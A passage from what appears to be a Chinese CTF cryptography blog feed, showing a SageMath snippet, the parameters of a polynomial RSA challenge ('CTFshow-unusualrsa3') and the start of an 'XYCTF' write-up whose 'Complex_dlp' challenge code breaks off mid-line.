<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res1.coefficients())):</span><br><span class="line">    rres += res1.coefficients()[i]*(m2^(res1.exponents()[i][<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>这一步的目的是因为虽然res只包含y，但它还是在二元多项式环空间中，我们提取系数和指数重新生成一个一元多项式。</p>
<h1 id="二，多项式RSA"><a href="#二，多项式RSA" class="headerlink" title="二，多项式RSA"></a>二，多项式RSA</h1><h2 id="1，CTFshow-unusualrsa3"><a href="#1，CTFshow-unusualrsa3" class="headerlink" title="1，CTFshow-unusualrsa3"></a>1，CTFshow-unusualrsa3</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line">p: </span><br><span class="line"><span class="number">2470567871</span></span><br><span class="line"></span><br><span class="line">N: </span><br><span class="line"><span class="number">1932231392</span>*x^<span class="number">255</span> + <span class="number">1432733708</span>*x^<span class="number">254</span> + <span class="number">1270867914</span>*x^<span class="number">253</span> + <span class="number">1573324635</span>*x^<span class="number">252</span> + <span class="number">2378103997</span>*x^<span class="number">251</span> + <span class="number">820889786</span>*x^<span class="number">250</span> + <span class="number">762279735</span>*x^<span class="number">249</span> + <span class="number">1378353578</span>*x^<span class="number">248</span> + <span class="number">1226179520</span>*x^<span class="number">247</span> + <span class="number">657116276</span>*x^<span class="number">246</span> + <span class="number">1264717357</span>*x^<span class="number">245</span> + <span class="number">1015587392</span>*x^<span class="number">244</span> + <span class="number">849699356</span>*x^<span class="number">243</span> + <span class="number">1509168990</span>*x^<span class="number">242</span> + <span class="number">2407367106</span>*x^<span class="number">241</span> + <span class="number">873379233</span>*x^<span class="number">240</span> + <span class="number">2391647981</span>*x^<span class="number">239</span> + <span class="number">517715639</span>*x^<span class="number">238</span> + <span class="number">828941376</span>*x^<span class="number">237</span> + <span class="number">843708018</span>*x^<span class="number">236</span> + <span class="number">1526075137</span>*x^<span class="number">235</span> + <span class="number">1499291590</span>*x^<span class="number">234</span> + <span class="number">235611028</span>*x^<span class="number">233</span> + <span class="number">19615265</span>*x^<span class="number">232</span> + <span class="number">53338886</span>*x^<span class="number">231</span> + <span class="number">434434839</span>*x^<span class="number">230</span> + <span class="number">902171938</span>*x^<span class="number">229</span> + <span class="number">516444143</span>*x^<span class="number">228</span> + <span class="number">1984443642</span>*x^<span class="number">227</span> + <span class="number">966493372</span>*x^<span class="number">226</span> + <span class="number">1166227650</span>*x^<span class="number">225</span> + <span class="number">1824442929</span>*x^<span class="number">224</span> + <span class="number">930231465</span>*x^<span class="number">223</span> + <span class="number">1664522302</span>*x^<span class="number">222</span> + <span class="number">1067203343</span>*x^<span class="number">221</span> + <span class="number">28569139</span>*x^<span class="number">220</span> + <span class="number">2327926559</span>*x^<span class="number">219</span> + <span class="number">899788156</span>*x^<span class="number">218</span> + <span class="number">296985783</span>*x^<span class="number">217</span> + <span class="number">1144578716</span>*x^<span class="number">216</span> + <span class="number">340677494</span>*x^<span class="number">215</span> + <span class="number">254306901</span>*x^<span class="number">214</span> + <span class="number">766641243</span>*x^<span class="number">213</span> + <span class="number">1882320336</span>*x^<span class="number">212</span> + <span class="number">2139903463</span>*x^<span class="number">211</span> + <span class="number">1904225023</span>*x^<span class="number">210</span> + <span class="number">475412928</span>*x^<span class="number">209</span> + <span class="number">127723603</span>*x^<span class="number">208</span> + <span class="number">2015416361</span>*x^<span class="number">207</span> + <span class="number">1500078813</span>*x^<span class="number">206</span> + <span class="number">1845826007</span>*x^<span class="number">205</span> + <span class="number">797486240</span>*x^<span class="number">204</span> + <span class="number">85924125</span>*x^<span class="number">203</span> + <span class="number">1921772796</span>*x^<span class="number">202</span> + <span class="number">1322682658</span>*x^<span class="number">201</span> + <span class="number">2372929383</span>*x^<span class="number">200</span> + <span class="number">1323964787</span>*x^<span class="number">199</span> + <span class="number">1302258424</span>*x^<span class="number">198</span> + <span class="number">271875267</span>*x^<span class="number">197</span> + <span class="number">1297768962</span>*x^<span class="number">196</span> + <span class="number">2147341770</span>*x^<span class="number">195</span> + <span class="number">1665066191</span>*x^<span class="number">194</span> + <span class="number">2342921569</span>*x^<span class="number">193</span> + <span class="number">1450622685</span>*x^<span class="number">192</span> + <span class="number">1453466049</span>*x^<span class="number">191</span> + <span class="number">1105227173</span>*x^<span class="number">190</span> + <span class="number">2357717379</span>*x^<span class="number">189</span> + <span class="number">1044263540</span>*x^<span class="number">188</span> + <span class="number">697816284</span>*x^<span class="number">187</span> + <span class="number">647124526</span>*x^<span class="number">186</span> + <span class="number">1414769298</span>*x^<span class="number">185</span> + <span class="number">657373752</span>*x^<span class="number">184</span> + <span class="number">91863906</span>*x^<span class="number">183</span> + <span class="number">1095083181</span>*x^<span class="number">182</span> + <span class="number">658171402</span>*x^<span class="number">181</span> + <span class="number">75339882</span>*x^<span class="number">180</span> + <span class="number">2216678027</span>*x^<span class="number">179</span> + <span class="number">2208320155</span>*x^<span class="number">178</span> + <span class="number">1351845267</span>*x^<span class="number">177</span> + <span class="number">1740451894</span>*x^<span class="number">176</span> + <span class="number">1302531891</span>*x^<span class="number">175</span> + <span class="number">320751753</span>*x^<span class="number">174</span> + <span class="number">1303477598</span>*x^<span class="number">173</span> + <span class="number">783321123</span>*x^<span class="number">172</span> + <span class="number">1400145206</span>*x^<span class="number">171</span> + <span class="number">1379768234</span>*x^<span class="number">170</span> + <span class="number">1191445903</span>*x^<span class="number">169</span> + <span class="number">946530449</span>*x^<span class="number">168</span> + <span class="number">2008674144</span>*x^<span class="number">167</span> + <span class="number">2247371104</span>*x^<span class="number">166</span> + <span class="number">1267042416</span>*x^<span class="number">165</span> + <span class="number">1795774455</span>*x^<span class="number">164</span> + <span class="number">1976911493</span>*x^<span class="number">163</span> + <span class="number">167037165</span>*x^<span class="number">162</span> + <span class="number">1848717750</span>*x^<span class="number">161</span> + <span class="number">573072954</span>*x^<span class="number">160</span> + <span class="number">1126046031</span>*x^<span class="number">159</span> + <span class="number">376257986</span>*x^<span class="number">158</span> + <span class="number">1001726783</span>*x^<span class="number">157</span> + <span class="number">2250967824</span>*x^<span class="number">156</span> + <span class="number">2339380314</span>*x^<span class="number">155</span> + <span class="number">571922874</span>*x^<span class="number">154</span> + <span class="number">961000788</span>*x^<span class="number">153</span> + <span class="number">306686020</span>*x^<span class="number">152</span> + <span class="number">80717392</span>*x^<span class="number">151</span> + <span class="number">2454799241</span>*x^<span class="number">150</span> + <span class="number">1005427673</span>*x^<span class="number">149</span> + <span class="number">1032257735</span>*x^<span class="number">148</span> + <span class="number">593980163</span>*x^<span class="number">147</span> + <span class="number">1656568780</span>*x^<span class="number">146</span> + <span class="number">1865541316</span>*x^<span class="number">145</span> + <span class="number">2003844061</span>*x^<span class="number">144</span> + <span class="number">1265566902</span>*x^<span class="number">143</span> + <span class="number">573548790</span>*x^<span class="number">142</span> + <span class="number">494063408</span>*x^<span class="number">141</span> + <span class="number">1722266624</span>*x^<span class="number">140</span> + <span class="number">938551278</span>*x^<span class="number">139</span> + <span class="number">2284832499</span>*x^<span class="number">138</span> + <span class="number">597191613</span>*x^<span class="number">137</span> + <span class="number">476121126</span>*x^<span class="number">136</span> + <span class="number">1237943942</span>*x^<span class="number">135</span> + <span class="number">275861976</span>*x^<span class="number">134</span> + <span class="number">1603993606</span>*x^<span class="number">133</span> + <span class="number">1895285286</span>*x^<span class="number">132</span> + <span class="number">589034062</span>*x^<span class="number">131</span> + <span class="number">713986937</span>*x^<span class="number">130</span> + <span class="number">1206118526</span>*x^<span class="number">129</span> + <span class="number">311679750</span>*x^<span class="number">128</span> + <span class="number">1989860861</span>*x^<span class="number">127</span> + <span class="number">1551409650</span>*x^<span class="number">126</span> + <span class="number">2188452501</span>*x^<span class="number">125</span> + <span class="number">1175930901</span>*x^<span class="number">124</span> + <span class="number">1991529213</span>*x^<span class="number">123</span> + <span class="number">2019090583</span>*x^<span class="number">122</span> + <span class="number">215965300</span>*x^<span class="number">121</span> + <span class="number">532432639</span>*x^<span class="number">120</span> + <span class="number">1148806816</span>*x^<span class="number">119</span> + <span class="number">493362403</span>*x^<span class="number">118</span> + <span class="number">2166920790</span>*x^<span class="number">117</span> + <span class="number">185609624</span>*x^<span class="number">116</span> + <span class="number">184370704</span>*x^<span class="number">115</span> + <span class="number">2141702861</span>*x^<span class="number">114</span> + <span class="number">223551915</span>*x^<span class="number">113</span> + <span class="number">298497455</span>*x^<span class="number">112</span> + <span class="number">722376028</span>*x^<span class="number">111</span> + <span class="number">678813029</span>*x^<span class="number">110</span> + <span class="number">915121681</span>*x^<span class="number">109</span> + <span class="number">1107871854</span>*x^<span class="number">108</span> + <span class="number">1369194845</span>*x^<span class="number">107</span> + <span class="number">328165402</span>*x^<span class="number">106</span> + <span class="number">1792110161</span>*x^<span class="number">105</span> + <span class="number">798151427</span>*x^<span class="number">104</span> + <span class="number">954952187</span>*x^<span class="number">103</span> + <span class="number">471555401</span>*x^<span class="number">102</span> + <span class="number">68969853</span>*x^<span class="number">101</span> + <span class="number">453598910</span>*x^<span class="number">100</span> + <span class="number">2458706380</span>*x^<span class="number">99</span> + <span class="number">889221741</span>*x^<span class="number">98</span> + <span class="number">320515821</span>*x^<span class="number">97</span> + <span class="number">1549538476</span>*x^<span class="number">96</span> + <span class="number">909607400</span>*x^<span class="number">95</span> + <span class="number">499973742</span>*x^<span class="number">94</span> + <span class="number">552728308</span>*x^<span class="number">93</span> + <span class="number">1538610725</span>*x^<span class="number">92</span> + <span class="number">186272117</span>*x^<span class="number">91</span> + <span class="number">862153635</span>*x^<span class="number">90</span> + <span class="number">981463824</span>*x^<span class="number">89</span> + <span class="number">2400233482</span>*x^<span class="number">88</span> + <span class="number">1742475067</span>*x^<span class="number">87</span> + <span class="number">437801940</span>*x^<span class="number">86</span> + <span class="number">1504315277</span>*x^<span class="number">85</span> + <span class="number">1756497351</span>*x^<span class="number">84</span> + <span class="number">197089583</span>*x^<span class="number">83</span> + <span class="number">2082285292</span>*x^<span class="number">82</span> + <span class="number">109369793</span>*x^<span class="number">81</span> + <span class="number">2197572728</span>*x^<span class="number">80</span> + <span class="number">107235697</span>*x^<span class="number">79</span> + <span class="number">567322310</span>*x^<span class="number">78</span> + <span class="number">1755205142</span>*x^<span class="number">77</span> + <span class="number">1089091449</span>*x^<span class="number">76</span> + <span class="number">1993836978</span>*x^<span class="number">75</span> + <span class="number">2393709429</span>*x^<span class="number">74</span> + <span class="number">170647828</span>*x^<span class="number">73</span> + <span class="number">1205814501</span>*x^<span class="number">72</span> + <span class="number">2444570340</span>*x^<span class="number">71</span> + <span class="number">328372190</span>*x^<span class="number">70</span> + <span class="number">1929704306</span>*x^<span class="number">69</span> + <span class="number">717796715</span>*x^<span class="number">68</span> + <span class="number">1057597610</span>*x^<span class="number">67</span> + <span class="number">482243092</span>*x^<span class="number">66</span> + <span class="number">277530014</span>*x^<span class="number">65</span> + <span class="number">2393168828</span>*x^<span class="number">64</span> + <span class="number">12380707</span>*x^<span class="number">63</span> + <span class="number">1108646500</span>*x^<span class="number">62</span> + <span class="number">637721571</span>*x^<span class="number">61</span> + <span class="number">604983755</span>*x^<span class="number">60</span> + <span class="number">1142068056</span>*x^<span class="number">59</span> + <span class="number">1911643955</span>*x^<span class="number">58</span> + <span class="number">1713852330</span>*x^<span class="number">57</span> + <span class="number">1757273231</span>*x^<span class="number">56</span> + <span class="number">1778819295</span>*x^<span class="number">55</span> + <span class="number">957146826</span>*x^<span class="number">54</span> + <span class="number">900005615</span>*x^<span class="number">53</span> + <span class="number">521467961</span>*x^<span class="number">52</span> + <span class="number">1255707235</span>*x^<span class="number">51</span> + <span class="number">861871574</span>*x^<span class="number">50</span> + <span class="number">397953653</span>*x^<span class="number">49</span> + <span class="number">1259753202</span>*x^<span class="number">48</span> + <span class="number">471431762</span>*x^<span class="number">47</span> + <span class="number">1245956917</span>*x^<span class="number">46</span> + <span class="number">1688297180</span>*x^<span class="number">45</span> + <span class="number">1536178591</span>*x^<span class="number">44</span> + <span class="number">1833258462</span>*x^<span class="number">43</span> + <span class="number">1369087493</span>*x^<span class="number">42</span> + <span class="number">459426544</span>*x^<span class="number">41</span> + <span class="number">418389643</span>*x^<span class="number">40</span> + <span class="number">1800239647</span>*x^<span class="number">39</span> + <span class="number">2467433889</span>*x^<span class="number">38</span> + <span class="number">477713059</span>*x^<span class="number">37</span> + <span class="number">1898813986</span>*x^<span class="number">36</span> + <span class="number">2202042708</span>*x^<span class="number">35</span> + <span class="number">894088738</span>*x^<span class="number">34</span> + <span class="number">1204601190</span>*x^<span class="number">33</span> + <span class="number">1592921228</span>*x^<span class="number">32</span> + <span class="number">2234027582</span>*x^<span class="number">31</span> + <span class="number">1308900201</span>*x^<span class="number">30</span> + <span class="number">461430959</span>*x^<span class="number">29</span> + <span class="number">718926726</span>*x^<span class="number">28</span> + <span class="number">2081988029</span>*x^<span class="number">27</span> + <span class="number">1337342428</span>*x^<span class="number">26</span> + <span class="number">2039153142</span>*x^<span class="number">25</span> + <span class="number">1364177470</span>*x^<span class="number">24</span> + <span class="number">613659517</span>*x^<span class="number">23</span> + <span class="number">853968854</span>*x^<span class="number">22</span> + <span class="number">1013582418</span>*x^<span class="number">21</span> + <span class="number">1167857934</span>*x^<span class="number">20</span> + <span class="number">2014147362</span>*x^<span class="number">19</span> + <span class="number">1083466865</span>*x^<span class="number">18</span> + <span class="number">1091690302</span>*x^<span class="number">17</span> + <span class="number">302196939</span>*x^<span class="number">16</span> + <span class="number">1946675573</span>*x^<span class="number">15</span> + <span class="number">2450124113</span>*x^<span class="number">14</span> + <span class="number">1199066291</span>*x^<span class="number">13</span> + <span class="number">401889502</span>*x^<span class="number">12</span> + <span class="number">712045611</span>*x^<span class="number">11</span> + <span class="number">1850096904</span>*x^<span class="number">10</span> + <span class="number">1808400208</span>*x^<span class="number">9</span> + <span class="number">1567687877</span>*x^<span class="number">8</span> + <span class="number">2013445952</span>*x^<span class="number">7</span> + <span class="number">2435360770</span>*x^<span class="number">6</span> + <span class="number">2414019676</span>*x^<span class="number">5</span> + <span class="number">2277377050</span>*x^<span class="number">4</span> + <span class="number">2148341337</span>*x^<span class="number">3</span> + <span class="number">1073721716</span>*x^<span class="number">2</span> + <span class="number">1045363399</span>*x + <span class="number">1809685811</span></span><br><span class="line"></span><br><span class="line">m^<span class="number">0x10001</span>%N:  </span><br><span class="line"><span class="number">922927962</span>*x^<span class="number">254</span> + <span class="number">1141958714</span>*x^<span class="number">253</span> + <span class="number">295409606</span>*x^<span class="number">252</span> + <span class="number">1197491798</span>*x^<span class="number">251</span> + <span class="number">2463440866</span>*x^<span class="number">250</span> + <span class="number">1671460946</span>*x^<span class="number">249</span> + <span class="number">967543123</span>*x^<span class="number">248</span> + <span class="number">119796323</span>*x^<span class="number">247</span> + <span class="number">1172760592</span>*x^<span class="number">246</span> + <span class="number">770640267</span>*x^<span class="number">245</span> + <span class="number">1093816376</span>*x^<span class="number">244</span> + <span class="number">196379610</span>*x^<span class="number">243</span> + <span class="number">2205270506</span>*x^<span class="number">242</span> + <span class="number">459693142</span>*x^<span class="number">241</span> + <span class="number">829093322</span>*x^<span class="number">240</span> + <span class="number">816440689</span>*x^<span class="number">239</span> + <span class="number">648546871</span>*x^<span class="number">238</span> + <span class="number">1533372161</span>*x^<span class="number">237</span> + <span class="number">1349964227</span>*x^<span class="number">236</span> + <span class="number">2132166634</span>*x^<span class="number">235</span> + <span class="number">403690250</span>*x^<span class="number">234</span> + <span class="number">835793319</span>*x^<span class="number">233</span> + <span class="number">2056945807</span>*x^<span class="number">232</span> + <span class="number">480459588</span>*x^<span class="number">231</span> + <span class="number">1401028924</span>*x^<span class="number">230</span> + <span class="number">2231055325</span>*x^<span class="number">229</span> + <span class="number">1716893325</span>*x^<span class="number">228</span> + <span class="number">16299164</span>*x^<span class="number">227</span> + <span class="number">1125072063</span>*x^<span class="number">226</span> + <span class="number">1903340994</span>*x^<span class="number">225</span> + <span class="number">1372971897</span>*x^<span class="number">224</span> + <span class="number">242927971</span>*x^<span class="number">223</span> + <span class="number">711296789</span>*x^<span class="number">222</span> + <span class="number">535407256</span>*x^<span class="number">221</span> + <span class="number">976773179</span>*x^<span class="number">220</span> + <span class="number">533569974</span>*x^<span class="number">219</span> + <span class="number">501041034</span>*x^<span class="number">218</span> + <span class="number">326232105</span>*x^<span class="number">217</span> + <span class="number">2248775507</span>*x^<span class="number">216</span> + <span class="number">1010397596</span>*x^<span class="number">215</span> + <span class="number">1641864795</span>*x^<span class="number">214</span> + <span class="number">1365178317</span>*x^<span class="number">213</span> + <span class="number">1038477612</span>*x^<span class="number">212</span> + <span class="number">2201213637</span>*x^<span class="number">211</span> + <span class="number">760847531</span>*x^<span class="number">210</span> + <span class="number">2072085932</span>*x^<span class="number">209</span> + <span class="number">168159257</span>*x^<span class="number">208</span> + <span class="number">70202009</span>*x^<span class="number">207</span> + <span class="number">1193933930</span>*x^<span class="number">206</span> + <span class="number">1559162272</span>*x^<span class="number">205</span> + <span class="number">1380642174</span>*x^<span class="number">204</span> + <span class="number">1296625644</span>*x^<span class="number">203</span> + <span class="number">1338288152</span>*x^<span class="number">202</span> + <span class="number">843839510</span>*x^<span class="number">201</span> + <span class="number">460174838</span>*x^<span class="number">200</span> + <span class="number">660412151</span>*x^<span class="number">199</span> + <span class="number">716865491</span>*x^<span class="number">198</span> + <span class="number">772161222</span>*x^<span class="number">197</span> + <span class="number">924177515</span>*x^<span class="number">196</span> + <span class="number">1372790342</span>*x^<span class="number">195</span> + <span class="number">320044037</span>*x^<span class="number">194</span> + <span class="number">117027412</span>*x^<span class="number">193</span> + <span class="number">814803809</span>*x^<span class="number">192</span> + <span class="number">1175035545</span>*x^<span class="number">191</span> + <span class="number">244769161</span>*x^<span class="number">190</span> + <span class="number">2116927976</span>*x^<span class="number">189</span> + <span class="number">617780431</span>*x^<span class="number">188</span> + <span class="number">342577832</span>*x^<span class="number">187</span> + <span class="number">356586691</span>*x^<span class="number">186</span> + <span class="number">695795444</span>*x^<span class="number">185</span> + <span class="number">281750528</span>*x^<span class="number">184</span> + <span class="number">133432552</span>*x^<span class="number">183</span> + <span class="number">741747447</span>*x^<span class="number">182</span> + <span class="number">2138036298</span>*x^<span class="number">181</span> + <span class="number">524386605</span>*x^<span class="number">180</span> + <span class="number">1231287380</span>*x^<span class="number">179</span> + <span class="number">1246706891</span>*x^<span class="number">178</span> + <span class="number">69277523</span>*x^<span class="number">177</span> + <span class="number">2124927225</span>*x^<span class="number">176</span> + <span class="number">2334697345</span>*x^<span class="number">175</span> + <span class="number">1769733543</span>*x^<span class="number">174</span> + <span class="number">2248037872</span>*x^<span class="number">173</span> + <span class="number">1899902290</span>*x^<span class="number">172</span> + <span class="number">409421149</span>*x^<span class="number">171</span> + <span class="number">1223261878</span>*x^<span class="number">170</span> + <span class="number">666594221</span>*x^<span class="number">169</span> + <span class="number">1795456341</span>*x^<span class="number">168</span> + <span class="number">406003299</span>*x^<span class="number">167</span> + <span class="number">992699270</span>*x^<span class="number">166</span> + <span class="number">2201384104</span>*x^<span class="number">165</span> + <span class="number">907692883</span>*x^<span class="number">164</span> + <span class="number">1667882231</span>*x^<span class="number">163</span> + <span class="number">1414341647</span>*x^<span class="number">162</span> + <span class="number">1592159752</span>*x^<span class="number">161</span> + <span class="number">28054099</span>*x^<span class="number">160</span> + <span class="number">2184618098</span>*x^<span class="number">159</span> + <span class="number">2047102725</span>*x^<span class="number">158</span> + <span class="number">103202495</span>*x^<span class="number">157</span> + <span class="number">1803852525</span>*x^<span class="number">156</span> + <span class="number">446464179</span>*x^<span class="number">155</span> + <span class="number">909116906</span>*x^<span class="number">154</span> + <span class="number">1541693644</span>*x^<span class="number">153</span> + <span class="number">166545130</span>*x^<span class="number">152</span> + <span class="number">2283548843</span>*x^<span class="number">151</span> + <span class="number">2348768005</span>*x^<span class="number">150</span> + <span class="number">71682607</span>*x^<span class="number">149</span> + <span class="number">484339546</span>*x^<span class="number">148</span> + <span class="number">669511666</span>*x^<span class="number">147</span> + <span class="number">2110974006</span>*x^<span class="number">146</span> + <span class="number">1634563992</span>*x^<span class="number">145</span> + <span class="number">1810433926</span>*x^<span class="number">144</span> + <span class="number">2388805064</span>*x^<span class="number">143</span> + <span class="number">1200258695</span>*x^<span class="number">142</span> + <span class="number">1555191384</span>*x^<span class="number">141</span> + <span class="number">363842947</span>*x^<span class="number">140</span> + <span class="number">1105757887</span>*x^<span class="number">139</span> + <span class="number">402111289</span>*x^<span class="number">138</span> + <span class="number">361094351</span>*x^<span class="number">137</span> + <span class="number">1788238752</span>*x^<span class="number">136</span> + <span class="number">2017677334</span>*x^<span class="number">135</span> + <span class="number">1506224550</span>*x^<span class="number">134</span> + <span class="number">648916609</span>*x^<span class="number">133</span> + <span class="number">2008973424</span>*x^<span class="number">132</span> + <span class="number">2452922307</span>*x^<span class="number">131</span> + <span class="number">1446527028</span>*x^<span class="number">130</span> + <span class="number">29659632</span>*x^<span class="number">129</span> + <span class="number">627390142</span>*x^<span class="number">128</span> + <span class="number">1695661760</span>*x^<span class="number">127</span> + <span class="number">734686497</span>*x^<span class="number">126</span> + <span class="number">227059690</span>*x^<span class="number">125</span> + <span class="number">1219692361</span>*x^<span class="number">124</span> + <span class="number">635166359</span>*x^<span class="number">123</span> + <span class="number">428703291</span>*x^<span class="number">122</span> + <span class="number">2334823064</span>*x^<span class="number">121</span> + <span class="number">204888978</span>*x^<span class="number">120</span> + <span class="number">1694957361</span>*x^<span class="number">119</span> + <span class="number">94211180</span>*x^<span class="number">118</span> + <span class="number">2207723563</span>*x^<span class="number">117</span> + <span class="number">872340606</span>*x^<span class="number">116</span> + <span class="number">46197669</span>*x^<span class="number">115</span> + <span class="number">710312088</span>*x^<span class="number">114</span> + <span class="number">305132032</span>*x^<span class="number">113</span> + <span class="number">1621042631</span>*x^<span class="number">112</span> + <span class="number">2023404084</span>*x^<span class="number">111</span> + <span class="number">2169254305</span>*x^<span class="number">110</span> + <span class="number">463525650</span>*x^<span class="number">109</span> + <span class="number">2349964255</span>*x^<span class="number">108</span> + <span class="number">626689949</span>*x^<span class="number">107</span> + <span class="number">2072533779</span>*x^<span class="number">106</span> + <span class="number">177264308</span>*x^<span class="number">105</span> + <span class="number">153948342</span>*x^<span class="number">104</span> + <span class="number">1992646054</span>*x^<span class="number">103</span> + <span class="number">2379817214</span>*x^<span class="number">102</span> + <span class="number">1396334187</span>*x^<span class="number">101</span> + <span class="number">2254165812</span>*x^<span class="number">100</span> + <span class="number">1300455472</span>*x^<span class="number">99</span> + <span class="number">2396842759</span>*x^<span class="number">98</span> + <span class="number">2398953180</span>*x^<span class="number">97</span> + <span class="number">88249450</span>*x^<span class="number">96</span> + <span class="number">1726340322</span>*x^<span class="number">95</span> + <span class="number">2004986735</span>*x^<span class="number">94</span> + <span class="number">2446249940</span>*x^<span class="number">93</span> + <span class="number">520126803</span>*x^<span class="number">92</span> + <span class="number">821544954</span>*x^<span class="number">91</span> + <span class="number">1177737015</span>*x^<span class="number">90</span> + <span class="number">676286546</span>*x^<span class="number">89</span> + <span class="number">1519043368</span>*x^<span class="number">88</span> + <span class="number">224894464</span>*x^<span class="number">87</span> + <span class="number">1742023262</span>*x^<span class="number">86</span> + <span class="number">142627164</span>*x^<span class="number">85</span> + <span class="number">1427710141</span>*x^<span class="number">84</span> + <span class="number">1504189919</span>*x^<span class="number">83</span> + <span class="number">688315682</span>*x^<span class="number">82</span> + <span class="number">1397842239</span>*x^<span class="number">81</span> + <span class="number">435187331</span>*x^<span class="number">80</span> + <span class="number">433176780</span>*x^<span class="number">79</span> + <span class="number">454834357</span>*x^<span class="number">78</span> + <span class="number">1046713282</span>*x^<span class="number">77</span> + <span class="number">1208458516</span>*x^<span class="number">76</span> + <span class="number">811240741</span>*x^<span class="number">75</span> + <span class="number">151611952</span>*x^<span class="number">74</span> + <span class="number">164192249</span>*x^<span class="number">73</span> + <span class="number">353336244</span>*x^<span class="number">72</span> + <span class="number">1779538914</span>*x^<span class="number">71</span> + <span class="number">1489144873</span>*x^<span class="number">70</span> + <span class="number">213140082</span>*x^<span class="number">69</span> + <span class="number">1874778522</span>*x^<span class="number">68</span> + <span class="number">908618863</span>*x^<span class="number">67</span> + <span class="number">1058334731</span>*x^<span class="number">66</span> + <span class="number">1706255211</span>*x^<span class="number">65</span> + <span class="number">708134837</span>*x^<span class="number">64</span> + <span class="number">1382118347</span>*x^<span class="number">63</span> + <span class="number">2111915733</span>*x^<span class="number">62</span> + <span class="number">1273497300</span>*x^<span class="number">61</span> + <span class="number">368639880</span>*x^<span class="number">60</span> + <span class="number">1652005004</span>*x^<span class="number">59</span> + <span class="number">1977610754</span>*x^<span class="number">58</span> + <span class="number">1412680185</span>*x^<span class="number">57</span> + <span class="number">2312775720</span>*x^<span class="number">56</span> + <span class="number">59793381</span>*x^<span class="number">55</span> + <span class="number">1345145822</span>*x^<span class="number">54</span> + <span class="number">627534850</span>*x^<span class="number">53</span> + <span class="number">2159477761</span>*x^<span class="number">52</span> + <span class="number">10450988</span>*x^<span class="number">51</span> + <span class="number">1479007796</span>*x^<span class="number">50</span> + <span class="number">2082579205</span>*x^<span class="number">49</span> + <span class="number">1158447154</span>*x^<span class="number">48</span> + <span class="number">126359830</span>*x^<span class="number">47</span> + <span class="number">393411272</span>*x^<span class="number">46</span> + <span class="number">2343384236</span>*x^<span class="number">45</span> + <span class="number">2191577465</span>*x^<span class="number">44</span> + <span class="number">1281188680</span>*x^<span class="number">43</span> + <span class="number">230049708</span>*x^<span class="number">42</span> + <span class="number">539600199</span>*x^<span class="number">41</span> + <span class="number">1711135601</span>*x^<span class="number">40</span> + <span class="number">1659775448</span>*x^<span class="number">39</span> + <span class="number">1716176055</span>*x^<span class="number">38</span> + <span class="number">904363231</span>*x^<span class="number">37</span> + <span class="number">2385749710</span>*x^<span class="number">36</span> + <span class="number">567278351</span>*x^<span class="number">35</span> + <span class="number">404199078</span>*x^<span class="number">34</span> + <span class="number">372670353</span>*x^<span class="number">33</span> + <span class="number">1286079784</span>*x^<span class="number">32</span> + <span class="number">1744355671</span>*x^<span class="number">31</span> + <span class="number">2316856064</span>*x^<span class="number">30</span> + <span class="number">2106475476</span>*x^<span class="number">29</span> + <span class="number">614988454</span>*x^<span class="number">28</span> + <span class="number">2149964943</span>*x^<span class="number">27</span> + <span class="number">1065233185</span>*x^<span class="number">26</span> + <span class="number">188130174</span>*x^<span class="number">25</span> + <span class="number">540415659</span>*x^<span class="number">24</span> + <span class="number">1031409799</span>*x^<span class="number">23</span> + <span class="number">1067085678</span>*x^<span class="number">22</span> + <span class="number">1005161755</span>*x^<span class="number">21</span> + <span class="number">249654085</span>*x^<span class="number">20</span> + <span class="number">1816791634</span>*x^<span class="number">19</span> + <span class="number">1437500292</span>*x^<span class="number">18</span> + <span class="number">448596413</span>*x^<span class="number">17</span> + <span class="number">2397497659</span>*x^<span class="number">16</span> + <span class="number">2353732701</span>*x^<span class="number">15</span> + <span class="number">2068949189</span>*x^<span class="number">14</span> + <span class="number">1826419168</span>*x^<span class="number">13</span> + <span class="number">1265366199</span>*x^<span class="number">12</span> + <span class="number">547031306</span>*x^<span class="number">11</span> + <span class="number">1016962374</span>*x^<span class="number">10</span> + <span class="number">160089486</span>*x^<span class="number">9</span> + <span class="number">2264803979</span>*x^<span class="number">8</span> + <span class="number">1081806194</span>*x^<span class="number">7</span> + <span class="number">824215340</span>*x^<span class="number">6</span> + <span class="number">497731793</span>*x^<span class="number">5</span> + <span class="number">45017166</span>*x^<span class="number">4</span> + <span class="number">317548920</span>*x^<span class="number">3</span> + <span class="number">1391127733</span>*x^<span class="number">2</span> + <span class="number">1752881284</span>*x + <span class="number">1290424106</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>XYCTF-crypto</title>
    <url>/2024/04/28/XYCTF-crypto/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次打比赛，被新生赛狠狠拷打了QAQ</p>
<span id="more"></span>

<h1 id="Complex-dlp"><a href="#Complex-dlp" class="headerlink" title="Complex_dlp"></a>Complex_dlp</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.im == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(self.re)</span><br><span class="line">        <span class="keyword">elif</span> self.re == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(self.im) == <span 